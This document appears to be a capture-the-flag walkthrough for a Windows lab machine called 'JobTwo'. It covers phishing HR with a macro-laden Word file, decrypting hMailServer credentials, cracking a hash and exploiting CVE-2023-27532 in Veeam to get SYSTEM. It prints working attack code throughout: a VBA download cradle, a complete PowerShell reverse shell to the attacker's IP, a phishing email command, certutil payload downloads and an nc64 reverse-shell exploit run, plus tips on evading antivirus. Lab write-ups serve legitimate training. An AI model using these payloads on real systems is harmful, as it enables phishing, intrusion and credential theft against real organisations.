<p><strong>Difficulty:</strong> Hard<br /><strong>OS:</strong> Windows Server 2022<br /><strong>Target IP:</strong> <code>10.129.238.35</code><br /><strong>Attacker IP:</strong> <code>10.10.14.6</code><br /><strong>Date:</strong> 2026-05-22</p>

<h2 id="executive-summary">Executive Summary</h2>
<p>JobTwo is a realistic Windows corporate environment that teaches a classic attack chain: <strong>phishing → credential extraction → local privilege escalation via third-party software</strong>. The box exposes SMTP (hMailServer), HTTP/HTTPS (IIS), WinRM, RDP, and most critically, Veeam Backup &amp; Replication services. The intended path is:</p>
<ol>
<li><strong>Phish HR</strong> with a malicious Word document containing a VBA macro.</li>
<li><strong>Catch a shell</strong> as the low-privileged user <code>Julian</code>.</li>
<li><strong>Decrypt hMailServer's database password</strong> to dump mail account hashes.</li>
<li><strong>Crack Ferdinand's password</strong> and pivot via WinRM.</li>
<li><strong>Exploit CVE-2023-27532</strong> in Veeam Backup &amp; Replication to escalate to <code>SYSTEM</code>.</li>
</ol>
<hr />
<h2 id="phase-1-reconnaissance-and-enumeration">Phase 1: Reconnaissance &amp; Enumeration</h2>
<h3 id="step-1-1-host-discovery-and-port-scanning">Step 1.1: Host Discovery &amp; Port Scanning</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">nmap -Pn -p25,80,443,5985,10001,10002,10003,9401 10.129.238.35 -T4 --open
</code></pre>
<p><strong>Why this scan?</strong></p>
<ul>
<li><code>-Pn</code>: The box doesn't respond to ICMP pings (common in HTB Windows boxes). We skip host discovery and treat the host as up.</li>
<li>We target known-interesting ports based on typical Windows CTF patterns: SMTP (phishing vector), HTTP/HTTPS (web apps), WinRM (remote management), and the Veeam ports (10001-10003).</li>
</ul>
<p><strong>Hacker Mindset:</strong> Don't spray all 65,535 ports blindly if you know the machine's archetype. This is a corporate Windows box. SMTP + Web + WinRM + Backup software is a <strong>classic enterprise stack</strong>. Prioritize services that are known to be misconfigured or that interact with users.</p>
<h3 id="step-1-2-full-service-enumeration">Step 1.2: Full Service Enumeration</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">nmap -p- --min-rate 10000 10.129.238.35 -T4 -Pn
</code></pre>
<p><strong>Results (key ports):</strong></p>
<pre><code>22/tcp    open   ssh
25/tcp    open   smtp      hMailServer smtpd
80/tcp    open   http      Microsoft IIS 10.0
443/tcp   open   https     Microsoft IIS 10.0
445/tcp   open   microsoft-ds
5985/tcp  open   wsman     WinRM
3389/tcp  open   ms-wbt-server  RDP
10001/tcp open   msexchange-logcopier  (Veeam)
10002/tcp open   msexchange-logcopier  (Veeam)
10003/tcp open   storagecraft-image    (Veeam)
</code></pre>
<p><strong>Analysis:</strong></p>
<ul>
<li><strong>Port 25 (SMTP):</strong> hMailServer is a Windows mail server. This is immediately interesting because SMTP is a <strong>delivery mechanism</strong> for phishing payloads.</li>
<li><strong>Ports 80/443 (HTTP/HTTPS):</strong> IIS is running. The TLS certificate on 443 reveals domain names: <code>job2.vl</code> and <code>www.job2.vl</code>.</li>
<li><strong>Port 5985 (WinRM):</strong> If we get credentials, this is our stable remote access path. Evil-WinRM is our friend.</li>
<li><strong>Ports 10001-10003:</strong> These are characteristic of <strong>Veeam Backup &amp; Replication</strong>. Veeam is enterprise backup software that often runs as <code>SYSTEM</code> and has a history of nasty vulnerabilities.</li>
<li><strong>SMB signing not enforced:</strong> Nmap's SMB scripts show message signing is "enabled but not required." This means NTLM relay is theoretically possible, but we have no creds yet to relay.</li>
</ul>
<p><strong>Hacker Mindset:</strong> When you see a mail server + a web server + WinRM, think <strong>phishing → initial shell → cred dumping → lateral movement</strong>. When you see Veeam, think <strong>privilege escalation target</strong>. Enterprise backup software is often the "forgotten admin" — it runs with highest privileges, is rarely patched, and its configuration files are gold mines.</p>
<h3 id="step-1-3-dns-and-web-enumeration">Step 1.3: DNS &amp; Web Enumeration</h3>
<p><strong>Step:</strong> Add the domain names to <code>/etc/hosts</code>.</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo '10.129.238.35 job2.vl www.job2.vl' | sudo tee -a /etc/hosts
</code></pre>
<p><strong>Why?</strong> The SSL certificate revealed these names. Without adding them, the website might not load correctly (vhost routing), and we might miss the attack vector.</p>
<p><strong>Web Browsing:</strong></p>
<ul>
<li>Visiting <code>http://10.129.238.35</code> or <code>http://job2.vl</code> returns IIS default 404.</li>
<li>Visiting <code>http://www.job2.vl</code> returns a fake company website for a boat rental business.</li>
</ul>
<p><strong>Critical Finding:</strong> The website says:</p>
<blockquote>
<p>"We are looking for a new captain! Send your resume as a Microsoft Word document to <a href="mailto:hr@job2.vl">hr@job2.vl</a>"</p>
</blockquote>
<p><strong>Hacker Mindset:</strong> This is the <strong>intended attack vector</strong>. The box is literally telling you how to get in. In real-world engagements, job application portals that accept document uploads are common phishing targets. When a site asks for a specific file type (especially Word), alarm bells should ring: <strong>macros, DDE, OLE objects</strong>.</p>
<p><strong>Feroxbuster / Directory Brute Force:</strong></p>
<pre><code class="language-bash" data-language="bash">feroxbuster -u http://www.job2.vl
</code></pre>
<p><strong>Result:</strong> Nothing interesting. Static site with <code>index.html</code>, <code>style.css</code>, <code>boat.jpg</code>. No admin panels, no login forms, no API endpoints.</p>
<p><strong>Hacker Mindset:</strong> If the web surface is minimal and the site explicitly asks for emailed documents, <strong>don't waste time on XSS/SQLi</strong>. The path is social engineering / phishing. Accept what the box gives you.</p>

<h2 id="phase-2-initial-access-the-phish">Phase 2: Initial Access - The Phish</h2>
<h3 id="step-2-1-understanding-the-attack-vector">Step 2.1: Understanding the Attack Vector</h3>
<p>We need to:</p>
<ol>
<li>Create a malicious Word document with a VBA macro.</li>
<li>The macro must download and execute a reverse shell when opened.</li>
<li>Send it via SMTP to <code>hr@job2.vl</code>.</li>
<li>Wait for the victim (an automated HR bot) to open it.</li>
</ol>
<p><strong>Why VBA macros?</strong></p>
<ul>
<li>Word documents natively support VBA (Visual Basic for Applications) macros.</li>
<li>Macros can run automatically on document open (<code>AutoOpen</code>, <code>Document_Open</code>).</li>
<li>The macro can execute shell commands — in our case, PowerShell.</li>
</ul>
<p><strong>Hacker Mindset:</strong> In red team engagements, <strong>macro-enabled documents are still incredibly effective</strong>. Despite Microsoft's security warnings, many enterprises either disable the warnings via GPO (rarely) or users simply click "Enable Content" out of habit. In CTFs, the victim bot usually just opens the document without hesitation.</p>
<h3 id="step-2-2-creating-the-malicious-document-on-linux">Step 2.2: Creating the Malicious Document on Linux</h3>
<p><strong>Challenge:</strong> We are on Kali Linux. We don't have Microsoft Word. Creating a <code>.docm</code> (macro-enabled OpenXML) or <code>.doc</code> (legacy OLE2) with VBA on Linux is non-trivial.</p>
<p><strong>Solution:</strong> We use <strong><code>reddoc</code></strong> — a Python tool that generates <code>.docm</code> files with embedded VBA macros from templates, entirely on Linux.</p>
<p><strong>Installation:</strong></p>
<pre><code class="language-bash" data-language="bash">git clone --depth 1 https://github.com/totekuh/reddoc.git
cd reddoc
pip3 install . --break-system-packages
</code></pre>
<p><strong>Generating the document:</strong></p>
<pre><code class="language-bash" data-language="bash">reddoc template docm iex --set URL=http://10.10.14.6/shell.ps1 | reddoc docm -o resume.docm
</code></pre>
<p><strong>What this does:</strong></p>
<ul>
<li>Uses the <code>iex</code> template (PowerShell IEX cradle).</li>
<li>Embeds a macro that runs:<pre><code class="language-vba" data-language="vba">Sub MyMacro()
    Dim cmd As String
    cmd = "powershell -ep bypass -w hidden -c ""$r=Invoke-WebRequest -UseBasicParsing -Uri 'http://10.10.14.6/shell.ps1';$b=$r.Content;$c=-join($b|ForEach-Object{[char]$_});$c|IEX"""
    Shell cmd, vbHide
End Sub
</code></pre>
</li>
<li>The macro triggers on both <code>AutoOpen</code> and <code>Document_Open</code> for maximum compatibility.</li>
</ul>
<p><strong>Hacker Mindset:</strong> Using a <strong>two-stage payload</strong> (macro downloads script, script executes shell) is stealthier than embedding the entire shellcode in the macro. The macro itself only contains a benign-looking download command. The real payload (<code>shell.ps1</code>) is hosted on our server and never touches disk permanently. This bypasses some AV static analysis.</p>
<h3 id="step-2-3-creating-the-powershell-reverse-shell">Step 2.3: Creating the PowerShell Reverse Shell</h3>
<p><strong>File:</strong> <code>shell.ps1</code></p>
<pre><code class="language-powershell" data-language="powershell">$c = New-Object System.Net.Sockets.TCPClient('10.10.14.6',4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b, 0, $i)
    $r = (iex $d 2&gt;&amp;1 | Out-String)
    $r2 = $r + 'PS ' + (pwd).Path + '&gt; '
    $rb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($rb, 0, $rb.Length)
    $s.Flush()
}
$c.Close()
</code></pre>
<p><strong>Why this specific reverse shell?</strong></p>
<ul>
<li>It's a <strong>pure PowerShell</strong> TCP reverse shell. No external binaries needed.</li>
<li>It gives us an interactive PowerShell prompt with working directory display.</li>
<li>It handles errors gracefully (<code>2&gt;&amp;1</code>) and returns output cleanly.</li>
</ul>
<p><strong>Hacker Mindset:</strong> Always prefer <strong>PowerShell or Python one-liners</strong> over binary payloads for initial access. Binaries get flagged by AV/EDR. PowerShell is native to Windows, lives off the land, and can be obfuscated or encoded if needed.</p>
<h3 id="step-2-4-setting-up-the-infrastructure">Step 2.4: Setting Up the Infrastructure</h3>
<p><strong>Terminal 1 - HTTP Server (serves shell.ps1):</strong></p>
<pre><code class="language-bash" data-language="bash">cd ~/Downloads/jobtwo
python3 -m http.server 80
</code></pre>
<p><strong>Terminal 2 - Netcat Listener (catches the shell):</strong></p>
<pre><code class="language-bash" data-language="bash">rlwrap -cAr nc -lvnp 4444
</code></pre>
<p><strong>Why <code>rlwrap</code>?</strong> It gives us readline support (arrow keys, command history) in the netcat shell, making interaction much more pleasant.</p>
<p><strong>Why port 80 for HTTP?</strong> The macro uses a standard HTTP URL. Using port 80 avoids firewall issues and looks less suspicious.</p>
<p><strong>Why port 4444?</strong> Any high port works. 4444 is a common CTF convention. We avoid 443 here to not need root privileges for binding.</p>
<p><strong>Hacker Mindset:</strong> Infrastructure discipline is key. Label your terminals. Know which port does what. In real engagements, you'd use a redirector or VPS to hide your origin IP.</p>
<h3 id="step-2-5-sending-the-phishing-email">Step 2.5: Sending the Phishing Email</h3>
<p><strong>Tool:</strong> <code>swaks</code> (Swiss Army Knife for SMTP)</p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">swaks --to hr@job2.vl \
  --from "candidate@job2.vl" \
  --header "Subject: Job Application" \
  --body "Please review my attached CV." \
  --attach @resume.docm \
  --server 10.129.238.35
</code></pre>
<p><strong>Critical detail:</strong> The <code>@</code> before <code>resume.docm</code> is <strong>mandatory</strong>. Without it, <code>swaks</code> sends the filename as text rather than attaching the actual file.</p>
<p><strong>Why <code>swaks</code>?</strong> It's the easiest CLI tool for crafting SMTP emails with attachments. It handles MIME encoding automatically.</p>
<p><strong>Why no TLS?</strong> hMailServer on port 25 accepts plaintext SMTP. We don't need TLS for delivery.</p>
<p><strong>Hacker Mindset:</strong> When crafting phishing emails, <strong>mimic legitimacy</strong>. Use a plausible sender (<code>candidate@job2.vl</code>), a professional subject line, and a short body. In real red teams, you'd spoof the From header or use a lookalike domain. Here, the bot doesn't validate — but good habits matter.</p>
<h3 id="step-2-6-the-callback">Step 2.6: The Callback</h3>
<p><strong>Expected timeline:</strong></p>
<ul>
<li>Email sends successfully (<code>250 Queued</code>)</li>
<li>1–3 minutes later: HTTP server shows <code>GET /shell.ps1</code></li>
<li>Immediately after: Netcat receives connection</li>
</ul>
<p><strong>Verification:</strong></p>
<pre><code>PS C:\WINDOWS\system32&gt; whoami
job2\julian
</code></pre>
<p><strong>Hacker Mindset:</strong> Patience. Automated bots on CTF boxes have delays. If you don't get a callback in 60 seconds, <strong>don't panic</strong>. Don't start changing things. Give it 2–3 minutes. In real phishing, callbacks can take hours or days.</p>

<h2 id="phase-3-shell-as-julian">Phase 3: Shell as Julian</h2>
<h3 id="step-3-1-stabilizing-the-shell">Step 3.1: Stabilizing the Shell</h3>
<p>We have a PowerShell reverse shell via netcat. It's functional but basic.</p>
<p><strong>Quick enumeration commands:</strong></p>
<pre><code class="language-powershell" data-language="powershell">whoami
hostname
ipconfig
</code></pre>
<p><strong>Hacker Mindset:</strong> Your first shell is fragile. Don't run heavy commands that might crash it. Do <strong>minimal, targeted enumeration</strong> to understand your context before moving.</p>
<h3 id="step-3-2-user-enumeration">Step 3.2: User Enumeration</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">net user
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>User accounts for \\JOB2
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Ferdinand                
Guest                    Julian                   svc_veeam                
WDAGUtilityAccount       
</code></pre>
<p><strong>Analysis:</strong></p>
<ul>
<li><code>Julian</code> is our current user.</li>
<li><code>Ferdinand</code> is another regular user with a home directory (seen later).</li>
<li><code>svc_veeam</code> is a service account — confirms Veeam is installed.</li>
<li><code>Administrator</code> is the local admin we need to reach.</li>
</ul>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">net user Ferdinand
</code></pre>
<p><strong>Key finding:</strong> Ferdinand is a member of <code>Remote Management Users</code> and <code>Remote Desktop Users</code>. This means he can authenticate via WinRM and RDP.</p>
<p><strong>Hacker Mindset:</strong> When you land on a Windows box, <strong>immediately enumerate users and groups</strong>. Look for users in <code>Remote Management Users</code> (WinRM access), <code>Remote Desktop Users</code> (RDP access), or administrators. These are your pivot targets.</p>
<h3 id="step-3-3-finding-hmailserver">Step 3.3: Finding hMailServer</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">Get-ChildItem "C:\Program Files (x86)\hMailServer"
</code></pre>
<p><strong>Why look here?</strong> We know hMailServer is the SMTP daemon (from Nmap). If we can access its configuration or database, we might find credentials or password hashes.</p>
<p><strong>Key file:</strong> <code>C:\Program Files (x86)\hMailServer\Bin\hMailServer.INI</code></p>
<p><strong>Contents:</strong></p>
<pre><code class="language-ini" data-language="ini">[Security]
AdministratorPassword=[redacted retired-lab hash or flag]

[Database]
Type=MSSQLCE
Password=REDACTED retired-lab hash or flag]
PasswordEncryption=1
</code></pre>
<p><strong>Hacker Mindset:</strong> Configuration files are <strong>low-hanging fruit</strong>. Applications often store passwords in INI, XML, or config files. Even if encrypted, the encryption scheme might be weak or use a known key. Always grep for <code>password</code>, <code>passwd</code>, <code>pwd</code>, <code>secret</code>, <code>key</code> in config files.</p>
<h3 id="step-3-4-decrypting-the-hmailserver-database-password">Step 3.4: Decrypting the hMailServer Database Password</h3>
<p><strong>Research:</strong> hMailServer uses <strong>Blowfish encryption</strong> with a hardcoded key: <code>THIS_KEY_IS_NOT_SECRET</code>. The encryption also involves endianness swapping.</p>
<p><strong>Decryption script (Python):</strong></p>
<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
import sys, binascii, struct
from Crypto.Cipher import Blowfish

def swap_endianness(data):
    result = b''
    for i in range(0, len(data), 4):
        word = data[i:i+4]
        if len(word) == 4:
            result += word[::-1]
        else:
            result += word
    return result

key = b'THIS_KEY_IS_NOT_SECRET'
encrypted = binascii.unhexlify(sys.argv[1])
encrypted_swapped = swap_endianness(encrypted)
cipher = Blowfish.new(key, Blowfish.MODE_ECB)
decrypted = cipher.decrypt(encrypted_swapped)
decrypted_swapped = swap_endianness(decrypted)
print(decrypted_swapped.rstrip(b'\x00').decode('utf-8', errors='replace'))
</code></pre>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">python3 hmail_decrypt.py [redacted retired-lab hash or flag]
</code></pre>
<p><strong>Result:</strong> <code>95C02068FD5D</code></p>
<p><strong>Hacker Mindset:</strong> When you see <code>PasswordEncryption=1</code>, investigate immediately. Google the application name + "decrypt password." Many applications use homegrown crypto or hardcoded keys. This is a <strong>classic CTF pattern</strong> and a real-world vulnerability class.</p>
<h3 id="step-3-5-dumping-the-mail-database">Step 3.5: Dumping the Mail Database</h3>
<p>The database is a SQL Server Compact Edition (<code>.sdf</code>) file. It's locked by the hMailServer process, so we copy it and upgrade it.</p>
<p><strong>Commands (from Julian shell):</strong></p>
<pre><code class="language-powershell" data-language="powershell">copy "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=REDACTED")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=REDACTED")
$conn.Open()
</code></pre>
<p><strong>Dump account hashes:</strong></p>
<pre><code class="language-powershell" data-language="powershell">$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT accountaddress, accountpassword FROM hm_accounts"
$reader = $cmd.ExecuteReader()
while($reader.Read()) { $reader["accountaddress"] + ":" + $reader["accountpassword"] }
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Julian@job2.vl:[redacted encoded lab material]
Ferdinand@job2.vl:[redacted encoded lab material]
hr@job2.vl:[redacted encoded lab material]
</code></pre>
<p><strong>Hacker Mindset:</strong> Databases are <strong>credential treasure troves</strong>. Even if passwords are hashed, cracking one hash can give you lateral movement. Always dump user tables, password history tables, and API key tables. The format here is SHA256-based (hMailServer custom format, hashcat mode 1421).</p>
<h3 id="step-3-6-cracking-ferdinand-s-password">Step 3.6: Cracking Ferdinand's Password</h3>
<p><strong>Tool:</strong> <code>hashcat</code></p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">echo 'Ferdinand@job2.vl:[redacted encoded lab material]' &gt; hashes.txt
hashcat hashes.txt /usr/share/wordlists/rockyou.txt --user
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>[redacted encoded lab material]:Franzi123!
</code></pre>
<p><strong>Hacker Mindset:</strong> Password cracking is about <strong>efficient wordlist selection</strong>. <code>rockyou.txt</code> is the go-to for CTFs. In real engagements, use breached password lists, company-specific wordlists, and masks. Ferdinand's password <code>Franzi123!</code> is a classic "name + numbers + symbol" pattern — exactly what users think is secure but isn't.</p>

<h2 id="phase-4-pivot-to-ferdinand">Phase 4: Pivot to Ferdinand</h2>
<h3 id="step-4-1-winrm-connection">Step 4.1: WinRM Connection</h3>
<p><strong>Tool:</strong> <code>evil-winrm</code></p>
<p><strong>Command:</strong></p>
<pre><code class="language-bash" data-language="bash">evil-winrm -i 10.129.238.35 -u Ferdinand -p REDACTED
</code></pre>
<p><strong>Why WinRM?</strong> Ferdinand is in the <code>Remote Management Users</code> group. WinRM (port 5985) provides a stable, interactive PowerShell remoting session. It's better than our netcat shell because it supports native PowerShell cmdlets, file uploads/downloads, and is generally more robust.</p>
<p><strong>Hacker Mindset:</strong> When you get creds, <strong>test all access vectors</strong> simultaneously: WinRM, RDP, SMB, SSH. WinRM is often the stealthiest and most functional for post-exploitation.</p>
<h3 id="step-4-2-capturing-the-user-flag">Step 4.2: Capturing the User Flag</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">cat C:\Users\Ferdinand\Desktop\user.txt
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>6e4ad6b[redacted]d668593c0
</code></pre>

<h2 id="phase-5-root-exploiting-veeam">Phase 5: Root - Exploiting Veeam</h2>
<h3 id="step-5-1-confirming-veeam-installation">Step 5.1: Confirming Veeam Installation</h3>
<p><strong>Command:</strong></p>
<pre><code class="language-powershell" data-language="powershell">Get-ChildItem "C:\Program Files\Veeam"
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>Backup and Replication
Backup File System VSS Integration
Veeam Distribution Service
</code></pre>
<p><strong>Verify version:</strong></p>
<pre><code class="language-powershell" data-language="powershell">[System.Diagnostics.FileVersionInfo]::GetVersionInfo("C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").FileVersion
</code></pre>
<p><strong>Result:</strong> <code>10.0.1.4854</code></p>
<p><strong>Analysis:</strong> Version 10.0.1.4854 is <strong>vulnerable to CVE-2023-27532</strong>. The patch builds are:</p>
<ul>
<li>v12: <code>12.0.0.1420 P20230223</code> or later</li>
<li>v11: <code>11.0.1.1261 P20230227</code> or later</li>
</ul>
<p><strong>Hacker Mindset:</strong> Enterprise backup software is a <strong>privilege escalation jackpot</strong>. It runs as <code>SYSTEM</code>, has deep filesystem access, and is frequently unpatched. Always check versions of backup, AV, and monitoring software. These are your escalations paths.</p>
<h3 id="step-5-2-understanding-cve-2023-27532">Step 5.2: Understanding CVE-2023-27532</h3>
<p><strong>Vulnerability:</strong> The Veeam Mount Service listens on TCP 9401 (localhost and network-facing). It deserializes .NET objects from RPC requests without proper validation. An attacker with local access can send a malicious serialized object that executes arbitrary commands as <code>SYSTEM</code>.</p>
<p><strong>Why it works here:</strong></p>
<ul>
<li>Ferdinand has local access (we have his WinRM session).</li>
<li>The Mount Service runs as <code>NT AUTHORITY\SYSTEM</code>.</li>
<li>The service listens on <code>127.0.0.1:9401</code>.</li>
</ul>
<p><strong>Hacker Mindset:</strong> CVE-2023-27532 is a <strong>local privilege escalation (LPE)</strong>. The key requirement is "local access" — even low-privileged users can exploit it. This is why getting ANY shell on a box is valuable. From there, you hunt for LPEs in software running with higher privileges.</p>
<h3 id="step-5-3-preparing-the-exploit-files">Step 5.3: Preparing the Exploit Files</h3>
<p>We need 5 files on the target:</p>
<ol>
<li><code>VeeamHax.exe</code> — The exploit binary</li>
<li><code>Veeam.Backup.Common.dll</code> — Required dependency</li>
<li><code>Veeam.Backup.Model.dll</code> — Required dependency</li>
<li><code>Veeam.Backup.Interaction.MountService.dll</code> — Required dependency</li>
<li><code>nc64.exe</code> — Netcat binary for the reverse shell</li>
</ol>
<p><strong>Downloading to Kali:</strong></p>
<pre><code class="language-bash" data-language="bash">cd /tmp
curl -sL -o VeeamHax.exe "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/VeeamHax.exe"
curl -sL -o Veeam.Backup.Common.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Common.dll"
curl -sL -o Veeam.Backup.Model.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Model.dll"
curl -sL -o Veeam.Backup.Interaction.MountService.dll "https://raw.githubusercontent.com/puckiestyle/CVE-2023-27532-RCE-Only/main/Veeam.Backup.Interaction.MountService.dll"
</code></pre>
<p><strong>Hacker Mindset:</strong> When exploiting .NET applications, <strong>dependencies matter</strong>. The exploit binary needs the exact DLL versions that the target application uses. The <code>puckiestyle</code> fork conveniently includes these DLLs in the repo, compiled against the vulnerable Veeam version.</p>
<h3 id="step-5-4-transferring-files-to-the-target">Step 5.4: Transferring Files to the Target</h3>
<p>Since <code>evil-winrm</code>'s <code>upload</code> command wasn't available in our version, we used <code>certutil</code> to download from our HTTP server.</p>
<p><strong>On Kali:</strong> Ensure the HTTP server is running:</p>
<pre><code class="language-bash" data-language="bash">cd ~/Downloads/jobtwo &amp;&amp; python3 -m http.server 80
</code></pre>
<p><strong>On Target (evil-winrm session):</strong></p>
<pre><code class="language-powershell" data-language="powershell">cd C:\Users\Ferdinand\Documents
certutil -urlcache -split -f http://10.10.14.6/VeeamHax.exe VeeamHax.exe
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Common.dll Veeam.Backup.Common.dll
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Model.dll Veeam.Backup.Model.dll
certutil -urlcache -split -f http://10.10.14.6/Veeam.Backup.Interaction.MountService.dll Veeam.Backup.Interaction.MountService.dll
certutil -urlcache -split -f http://10.10.14.6/nc64.exe nc64.exe
</code></pre>
<p><strong>Why <code>certutil</code>?</strong> It's a built-in Windows binary for certificate operations, but it has a secret weapon: <code>-urlcache -split -f</code> downloads files over HTTP. It's <strong>living off the land</strong> — no suspicious third-party tools needed for the transfer itself.</p>
<p><strong>Hacker Mindset:</strong> <code>certutil</code> is a classic LOLBAS (Living Off The Land Binary). Defenders might not flag it because it's a legitimate system tool. Always know your built-in downloaders: <code>certutil</code>, <code>bitsadmin</code>, <code>powershell -c iwr</code>, <code>curl</code> (on Win10+).</p>
<h3 id="step-5-5-executing-the-exploit">Step 5.5: Executing the Exploit</h3>
<p><strong>Terminal setup:</strong> Start a new netcat listener for the SYSTEM shell:</p>
<pre><code class="language-bash" data-language="bash">rlwrap -cAr nc -lvnp 9090
</code></pre>
<p><strong>On Target:</strong></p>
<pre><code class="language-powershell" data-language="powershell">.\VeeamHax.exe --target 127.0.0.1 --cmd "C:\Users\Ferdinand\Documents\nc64.exe 10.10.14.6 9090 -e cmd.exe"
</code></pre>
<p><strong>What happens:</strong></p>
<ol>
<li><code>VeeamHax.exe</code> connects to the Veeam Mount Service on <code>127.0.0.1:9401</code>.</li>
<li>It sends a malicious deserialized .NET object.</li>
<li>The Mount Service executes our command: <code>nc64.exe 10.10.14.6 9090 -e cmd.exe</code>.</li>
<li>Since the Mount Service runs as <code>SYSTEM</code>, our command runs as <code>SYSTEM</code>.</li>
</ol>
<p><strong>Expected output on listener:</strong></p>
<pre><code>connect to [10.10.14.6] from (UNKNOWN) [10.129.238.35] 53402
Microsoft Windows [Version 10.0.20348.4297]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32&gt;whoami
nt authority\system
</code></pre>
<p><strong>Hacker Mindset:</strong> Target <code>127.0.0.1</code> for local services. Even if a port isn't exposed externally (nmap didn't show 9401 open from outside), it's almost certainly listening on localhost. Local services running as SYSTEM are the <strong>holy grail of privilege escalation</strong>.</p>

<h2 id="the-hacker-mindset-lessons-learned">The Hacker Mindset - Lessons Learned</h2>
<h3 id="1-reconnaissance-is-90-of-the-battle">1. Reconnaissance is 90% of the battle</h3>
<p>Nmap didn't just show ports; it showed an <strong>archetype</strong>: Windows corporate box with email, web, remote management, and backup software. Each service suggested a phase of the attack. Don't scan blindly — interpret the results.</p>
<h3 id="2-follow-the-intended-path-but-verify">2. Follow the intended path (but verify)</h3>
<p>The website literally told us to send a Word document. In CTFs, this is the intended vector. In real life, job portals accepting resumes are <strong>prime phishing targets</strong>. Always look for human-interaction points: HR portals, contact forms, email addresses.</p>
<h3 id="3-two-stage-payloads-are-stealthier">3. Two-stage payloads are stealthier</h3>
<p>Embedding a full reverse shell in a macro is noisy. A simple PowerShell download cradle (<code>IEX(IWR ...)</code>) is short, less suspicious, and the real payload lives on your server. This is how real malware operates.</p>
<h3 id="4-configuration-files-credentials">4. Configuration files = credentials</h3>
<p>hMailServer stored its database password in an INI file, encrypted with a <strong>hardcoded key</strong>. This is absurdly common in real software. Always grep configs for passwords, API keys, and connection strings.</p>
<h3 id="5-crack-efficiently">5. Crack efficiently</h3>
<p>We didn't need to crack Julian's or hr's hashes. We only needed Ferdinand's because he's in <code>Remote Management Users</code>. Focus your cracking efforts on <strong>high-value targets</strong>, not every hash you find.</p>
<h3 id="6-enterprise-software-is-the-weak-link">6. Enterprise software is the weak link</h3>
<p>Veeam Backup &amp; Replication was the key to SYSTEM. Backup software, AV consoles, monitoring agents, and hypervisor tools often run with highest privileges and are <strong>patched less frequently</strong> than the OS itself. They're your privilege escalation targets.</p>
<h3 id="7-localhost-services-matter">7. Localhost services matter</h3>
<p>Port 9401 wasn't open externally, but it was listening on <code>127.0.0.1</code>. Once you have any shell on a box, <strong>always scan localhost</strong>. Tools like <code>netstat -ano</code>, <code>Get-NetTCPConnection</code>, or static compiled <code>nmap</code> can reveal these hidden gems.</p>
<h3 id="8-patience-pays">8. Patience pays</h3>
<p>The phishing callback took 2–3 minutes. In real engagements, initial access can take hours, days, or weeks. Don't panic. Don't change your payload prematurely. Let the bot do its job.</p>
